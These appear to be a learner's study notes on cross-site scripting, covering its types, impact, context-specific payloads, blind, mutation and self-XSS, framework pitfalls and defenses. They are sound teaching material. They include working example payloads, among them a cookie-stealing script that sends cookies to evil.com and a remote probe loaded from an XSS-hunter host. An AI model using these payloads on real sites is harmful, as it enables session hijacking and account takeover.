# Cross-Site Scripting (XSS)
Tags: #vulnerability #xss #injection #client-side #day5

## What is XSS and why does it exist?

The server or browser renders user input into HTML, and the browser's parser processes it as code instead of data. The attacker's input — a `<script>` tag, an event handler, a `javascript:` URL — gets treated as part of the page's actual code.

Same root cause as SQLi: user input concatenated into a structured language (HTML/JavaScript instead of SQL) without separation between code and data. OWASP A03:2021 (Injection).

## What can an attacker actually do with XSS?

XSS gives the attacker the same power as the victim's browser. Whatever the user can do on that site, the attacker can do programmatically.

**Session hijacking** — `document.cookie` grabs the session token (if not HttpOnly) and sends it to the attacker's server. Attacker pastes it into their browser, logged in as the victim.

**Actions as the victim** — JavaScript can make any request the victim can make. `fetch('/api/transfer', {method: 'POST', body: '{"to":"attacker","amount":10000"}'})`. The request comes from the victim's browser with the victim's session — the server sees a legitimate authenticated request. This is essentially CSRF but more powerful because same-origin JavaScript bypasses all CSRF protections (tokens, SameSite, custom headers).

**Credential theft** — inject a fake login form over the real page. "Your session has expired, please log in again." Victim types credentials into the attacker's form, sent to the attacker's server. Or install a keylogger capturing every keystroke on the page.

Beyond these: read sensitive page content, redirect to phishing pages, spread to other users (self-propagating XSS worms), access browser APIs (webcam, microphone).

## What's the difference between reflected, stored, and DOM-based XSS?

All three achieve the same impact. The difference is how the payload gets into the page and where the vulnerability lives.

**Reflected** — payload travels in the request, server includes it in the response immediately. Not stored anywhere. Only fires when the victim clicks the specific crafted URL.

**Stored** — payload is saved to the database (comment, profile field, support ticket), served to every user who visits the page. No social engineering needed — every visitor is a victim.

**DOM-based** — server is not involved at all. Client-side JavaScript reads from a source (URL hash, query params) and writes to a dangerous sink (`innerHTML`, `document.write`). The payload never hits the server, never appears in server logs, and server-side defenses can't see it.

## How does reflected XSS work end-to-end?

1. App has a search page: `https://shop.com/search?q=shoes` — displays "You searched for: shoes" by dropping the `q` parameter into the HTML
2. Attacker crafts: `https://shop.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
3. Attacker sends the link to the victim — email, message, social media
4. Victim clicks. Browser sends the request to shop.com with the malicious `q` parameter
5. Server builds HTML: `You searched for: <script>document.location=...` — includes the payload directly without sanitizing
6. Browser receives the HTML, parses it, encounters the `<script>` tag, executes it

The payload bounces off the server and back — that's why it's "reflected." Server-side code like `return f"You searched for: {query}"` doesn't know or care what's in the parameter. It drops it into HTML and sends it.

## Why is stored XSS more dangerous than reflected?

Scale. Reflected XSS hits one person who clicks a link. Stored XSS hits every person who visits the page.

A stored XSS in a popular product's comment section steals the session cookie of every customer who views that product. Thousands of accounts compromised automatically, silently, without social engineering.

The Samy worm (MySpace, 2005) was stored XSS that automatically added the attacker as a friend AND copied itself to the victim's profile. Every visitor got infected. Over a million users in under 24 hours.

## How does DOM-based XSS work without the server?

```javascript
var search = document.location.hash.substring(1);
document.getElementById('results').innerHTML = "You searched for: " + search;
```

Normal: `https://shop.com/page#shoes` → writes "You searched for: shoes"

Malicious: `https://shop.com/page#<img src=x onerror=alert(document.cookie)>` → JavaScript reads the payload from the hash, writes it via `innerHTML`, browser parses the `<img>` tag, `onerror` fires.

Everything after `#` is never sent to the server — that's a browser rule. The vulnerability is entirely in client-side JavaScript that reads from an unsafe source and writes to a dangerous sink.

**Sources** — where attacker input comes from: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`

**Sinks** — dangerous functions that write to the page: `innerHTML`, `document.write`, `eval()`, `setTimeout(string)`, `.outerHTML`

Server-side WAFs, logging, and sanitization are all blind to DOM-based XSS.

## How does the payload change based on injection context?

The same `<script>alert(1)</script>` doesn't work everywhere. The payload depends on where your input lands.

**HTML body** — straightforward: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`

**Inside an HTML attribute** — `<input value="USER_INPUT">`. Input is between quotes, so `<script>` is just text. Break out first: `"><script>alert(1)</script>`. Or stay in the tag and add an event handler: `" onfocus="alert(1)" autofocus="` — no new tags needed.

**Inside a JavaScript string** — `var name = 'USER_INPUT';`. Already inside a script block. Break the string: `'; alert(1); //`. Close string, end statement, inject code, comment out the rest. Same principle as SQLi quote-breaking.

**In a URL/href** — `<a href="USER_INPUT">`. Use `javascript:alert(document.cookie)`. No script tags, no breaking out. The `href` attribute natively supports `javascript:` as a protocol. Clicking the link executes it.

This is why filtering for `<script>` is useless — XSS has dozens of vectors. Context-aware encoding is the only real defense.

## What is blind XSS?

Your payload fires in a context you never see — an admin panel, a logging dashboard, an internal tool. You submit a support ticket with an XSS payload. Days later, an admin opens the ticket in their internal dashboard and the payload executes.

You can't use `alert(1)` — you'll never see it. Instead:

```html
<script src="https://your-xss-hunter.com/probe.js"></script>
```

When it fires, the external script calls back to your server with the page URL, DOM content (now you can see the admin panel), cookies, IP, User-Agent, and a screenshot.

**Tools:** XSS Hunter (hosted platform, notifies when payloads fire), Burp Collaborator (confirms callback), your own VPS.

**Where to inject:** support tickets, feedback forms, profile fields (name, bio), order notes, User-Agent header, Referer header — any input viewed later by a human in a different interface.

Blind XSS is often high severity because it typically fires in admin or internal contexts — stealing an admin's cookie is instant privilege escalation.

## What is mutation XSS (mXSS)?

The developer sanitizes correctly, but the browser's HTML parser "fixes" the sanitized output in a way that creates XSS.

Browsers don't just display HTML — they parse and rearrange it to make it "valid." Special parsing rules for `<math>`, `<svg>`, `<table>` elements cause the browser to move elements around. An `<img>` tag that the sanitizer saw as safely inside a `<style>` tag (CSS text, not executable) gets moved outside during browser normalization — now it's in HTML context and the `onerror` fires.

The sanitizer sees the HTML one way, the browser rebuilds it another way. Input passes DOMPurify, passes server-side checks, looks clean — then the browser mutates it into something dangerous.

DOMPurify handles many known mXSS vectors by using the browser's own DOM parser for sanitization. But new vectors are discovered periodically as people find new parser quirks.

## When does self-XSS matter?

Self-XSS — payload only executes in the attacker's own session. A field only you can see. Seems useless.

It becomes dangerous when chained:

**Self-XSS + CSRF** — attacker uses CSRF to make the victim submit the XSS payload into the victim's own profile. Payload fires in the victim's session.

**Self-XSS + login CSRF** — attacker forces the victim to log into the attacker's account (CSRF on the login form). The attacker's account has XSS in the profile. Victim's browser executes it.

## How does XSS work through file uploads?

**SVG files** — SVGs are XML. They support `<script>` tags. Upload an SVG as a profile picture, if the server serves it at `https://app.com/uploads/avatar.svg` with `Content-Type: image/svg+xml`, the browser renders it and executes the JavaScript. Full XSS on the application's origin.

**HTML files** — upload `malicious.html`, served on the app's domain, executes in that origin.

**Defenses:**
- Serve with `Content-Type: application/octet-stream` — forces download
- Serve with `Content-Disposition: attachment` — forces download
- Serve uploads from a different domain (`uploads.app-cdn.com`) — XSS fires on a different origin, can't access `app.com`'s cookies
- Strip script tags from SVGs during processing, or convert to PNG

Any user-uploaded file served on your domain with a renderable content type is a potential XSS vector.

## How do frameworks accidentally reintroduce XSS?

Every framework provides safe defaults AND an escape hatch for raw HTML. Developers use the escape hatch, XSS returns.

**React** — auto-escapes by default, but:
- `dangerouslySetInnerHTML={{__html: userInput}}` — renders raw HTML
- `<a href={userInput}>` — if input is `javascript:alert(1)`, React lets it through. No angle brackets to escape, no characters React encodes. User clicks, JavaScript executes.
- SSR can bypass client-side protections if input is injected during server rendering

**Angular** — sanitizes by default, but:
- `bypassSecurityTrustHtml()` — escape hatch, same problem
- Template injection — user input in an Angular template can execute code
- `[innerHTML]="userInput"` — Angular sanitizes but older versions had bypasses

**Vue** — auto-escapes by default, but:
- `v-html="userInput"` — renders raw HTML, no sanitization

## How do you fix XSS?

**Output encoding** — the primary defense. Convert dangerous characters so the browser displays them as text instead of interpreting them as code. `<script>` becomes `&lt;script&gt;` — rendered as visible text, not executed.

**Encode on output, not input.** The same data might land in HTML, a JavaScript string, a URL, or CSS. Each context has different dangerous characters. If you HTML-encode on input but later place the data in a JavaScript string, the HTML encoding is meaningless in that context.

| Context | Encoding |
|---|---|
| HTML body | HTML entities (`<` → `&lt;`) |
| JavaScript string | JavaScript escaping (`'` → `\'`) |
| URL parameter | URL encoding (`<` → `%3C`) |
| HTML attribute | Attribute encoding |
| CSS value | CSS escaping |

**CSP (Content Security Policy)** — defense in depth. HTTP header telling the browser: only execute scripts from specific allowed sources.

`Content-Security-Policy: script-src 'self' https://cdn.trusted.com`

Blocks inline scripts (what XSS injects), `eval()`, scripts from untrusted domains. Doesn't prevent the injection — prevents execution. The seatbelt when encoding was missed somewhere.

Common CSP mistakes: `script-src 'unsafe-inline'` (allows all inline scripts, useless), overly broad allowlists, not setting CSP at all.

**DOM-based fix** — use safe sinks. `textContent` instead of `innerHTML` (treats everything as plain text). If HTML is needed, sanitize with DOMPurify. Never pass user input to `eval()`, `setTimeout(string)`, `document.write()`.

## Why is XSS so hard to eliminate?

Output encoding has to be correct in every single place user data is rendered. One missed field in a large app — vulnerable. CSP is hard to deploy without breaking functionality (inline scripts, third-party analytics, legacy code). DOM-based XSS keeps growing as apps become more JavaScript-heavy. Context switching between HTML, JavaScript, URLs, and CSS is error-prone. Frameworks help with safe defaults but developers use the escape hatches.

XSS has been in the OWASP Top 10 for over 20 years. The defenses exist — applying them consistently across an entire application is the hard part.

## My Notes
